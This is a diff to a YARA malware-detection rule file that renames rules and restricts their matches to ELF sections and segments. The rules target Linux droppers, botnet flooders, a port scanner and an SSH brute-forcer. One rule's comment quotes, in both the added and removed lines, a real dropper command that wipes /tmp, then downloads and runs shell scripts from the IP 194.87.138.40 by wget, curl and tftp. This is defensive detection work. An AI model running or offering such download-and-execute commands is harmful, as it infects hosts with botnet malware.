@@ -152,7 +152,7 @@ rule ShellExec_UserAdd {
     all of them
 }
 
-rule ShellExec_WgetDloader {
+rule Dropper_Wget {
   meta:
     description = "Bash commands to download and execute binaries using wget"
     reference = "https://www.trendmicro.com/en_us/research/19/d/bashlite-iot-malware-updated-with-mining-and-backdoor-commands-targets-wemo-devices.html"
@@ -165,7 +165,7 @@ rule ShellExec_WgetDloader {
     all of them
 }
 
-rule ShellExec_CurlDloader {
+rule Dropper_Curl {
   meta:
     description = "Bash commands to download and execute binaries using CURL"
     refrence = "https://otx.alienvault.com/indicator/file/2557ee8217d6bc7a69956e563e0ed926e11eb9f78e6c0816f6c4bf435cab2c81"
@@ -178,7 +178,22 @@ rule ShellExec_CurlDloader {
     all of them
 }
 
-rule HackTool_DOS1 {
+rule Dropper_WgetCurl {
+  meta:
+    description = "Bash commands to download and execute binaries using CURL || Wget"
+    author = "Nong Hoang Tu"
+    date = "12/11/2021"
+    target = "File, process's cmd, memory"
+    hash = "16bbeec4e23c0dc04c2507ec0d257bf97cfdd025cd86f8faf912cea824b2a5ba"
+    hash = "b34bb82ef2a0f3d02b93ed069fee717bd1f9ed9832e2d51b0b2642cb0b4f3891"
+    // Tested target cd /tmp && rm -rf * && wget http://194.87.138.40/BootzIV.sh || curl -O http://194.87.138.40/BootzIV.sh && chmod 777 BootzIV.sh && ./BootzIV.sh && busybox tftp 194.87.138.40 -c get tftp1.sh && chmod 777 tftp1.sh && ./tftp1.sh && busybox tftp -r tftp2.sh -g 194.87.138.40 && chmod 777 tftp2.sh && ./tftp2.sh && rm -rf BootzIV.sh tftp1.sh tftp2.sh
+  strings:
+    $re1 = /wget([ \S])+[; |]+curl([ \S]+)\-O([ \S])+[ |]+[&|; ]+chmod[&|; \d\w\.]+\//
+  condition:
+    all of them
+}
+
+rule Flooder_Gen1 {
   meta:
     author = "Nong Hoang Tu"
     description = "Botnet.Linux.LizardSquad"
@@ -192,10 +207,20 @@ rule HackTool_DOS1 {
     $4 = "LOLNOGTFO"
     $5 = "KILLATTK"
   condition:
-    2 of them
+  (
+    is_elf and for any i in (0 .. elf.number_of_sections):
+    (
+      2 of them in (elf.sections[i].offset .. elf.sections[i].offset + elf.sections[i].size)
+    )
+  )
+  or
+  for any i in (0 .. elf.number_of_segments):
+  (
+    2 of them in (elf.segments[i].virtual_address .. elf.segments[i].virtual_address + elf.segments[i].memory_size)
+  )
 }
 
-rule HackTool_DOS2 {
+rule Flooder_Gen2 {
   meta:
     author = "Nong Hoang Tu"
     email = "dmknght@parrotsec.org"
@@ -205,10 +230,20 @@ rule HackTool_DOS2 {
     $2 = "[HTTP] Flooding" ascii
     $3 = "[UDP] Flooding Rooted Spoof" ascii
   condition:
-    all of them
+  (
+    is_elf and for any i in (0 .. elf.number_of_sections):
+    (
+      2 of them in (elf.sections[i].offset .. elf.sections[i].offset + elf.sections[i].size)
+    )
+  )
+  or
+  for any i in (0 .. elf.number_of_segments):
+  (
+    2 of them in (elf.segments[i].virtual_address .. elf.segments[i].virtual_address + elf.segments[i].memory_size)
+  )
 }
 
-rule HackTool_DOS3 {
+rule Flooder_Gen3 {
   meta:
     author = "Nong Hoang Tu"
     email = "dmknght@parrotsec.org"
@@ -219,10 +254,20 @@ rule HackTool_DOS3 {
     $1 = "Opening sockets"
     $2 = "Sending attack"
   condition:
-    all of them
+  (
+    is_elf and for any i in (0 .. elf.number_of_sections):
+    (
+      all of them in (elf.sections[i].offset .. elf.sections[i].offset + elf.sections[i].size)
+    )
+  )
+  or
+  for any i in (0 .. elf.number_of_segments):
+  (
+    all of them in (elf.segments[i].virtual_address .. elf.segments[i].virtual_address + elf.segments[i].memory_size)
+  )
 }
 
-rule HackTool_NetScan1 {
+rule Netscan_Gen1 {
   meta:
     author = "Nong Hoang Tu"
     email = "dmknght@parrotsec.org"
@@ -232,10 +277,20 @@ rule HackTool_NetScan1 {
     $2 = "Usage: %s <b-block> <port> [c-block]"
     $3 = "Portscan completed in"
   condition:
-    all of them
+  (
+    is_elf and for any i in (0 .. elf.number_of_sections):
+    (
+      all of them in (elf.sections[i].offset .. elf.sections[i].offset + elf.sections[i].size)
+    )
+  )
+  or
+  for any i in (0 .. elf.number_of_segments):
+  (
+    all of them in (elf.segments[i].virtual_address .. elf.segments[i].virtual_address + elf.segments[i].memory_size)
+  )
 }
 
-rule HackTool_SSHBrute1 {
+rule SshBrute_Gen1 {
   meta:
     author = "Nong Hoang Tu"
     email = "dmknght@parrotsec.org"
@@ -244,7 +299,17 @@ rule HackTool_SSHBrute1 {
     $1 = "FOUND: %s with port %s open"
     $2 = "%s:%s %s port: %s --> %s"
   condition:
-    all of them
+  (
+    is_elf and for any i in (0 .. elf.number_of_sections):
+    (
+      all of them in (elf.sections[i].offset .. elf.sections[i].offset + elf.sections[i].size)
+    )
+  )
+  or
+  for any i in (0 .. elf.number_of_segments):
+  (
+    all of them in (elf.segments[i].virtual_address .. elf.segments[i].virtual_address + elf.segments[i].memory_size)
+  )
 }
 
 
@@ -289,21 +354,6 @@ rule HackTool_SSHBrute1 {
 //   condition:
 //     any of them
 // }
-
-rule ShellExec_WgetCurlDloader {
-  meta:
-    description = "Bash commands to download and execute binaries using CURL || Wget"
-    author = "Nong Hoang Tu"
-    date = "12/11/2021"
-    target = "File, process's cmd, memory"
-    hash = "16bbeec4e23c0dc04c2507ec0d257bf97cfdd025cd86f8faf912cea824b2a5ba"
-    hash = "b34bb82ef2a0f3d02b93ed069fee717bd1f9ed9832e2d51b0b2642cb0b4f3891"
-    // Tested target cd /tmp && rm -rf * && wget http://194.87.138.40/BootzIV.sh || curl -O http://194.87.138.40/BootzIV.sh && chmod 777 BootzIV.sh && ./BootzIV.sh && busybox tftp 194.87.138.40 -c get tftp1.sh && chmod 777 tftp1.sh && ./tftp1.sh && busybox tftp -r tftp2.sh -g 194.87.138.40 && chmod 777 tftp2.sh && ./tftp2.sh && rm -rf BootzIV.sh tftp1.sh tftp2.sh
-  strings:
-    $re1 = /wget([ \S])+[; |]+curl([ \S]+)\-O([ \S])+[ |]+[&|; ]+chmod[&|; \d\w\.]+\//
-  condition:
-    all of them
-}
 
 // rule OSCommand_Syslog_Removal {
 //   meta:
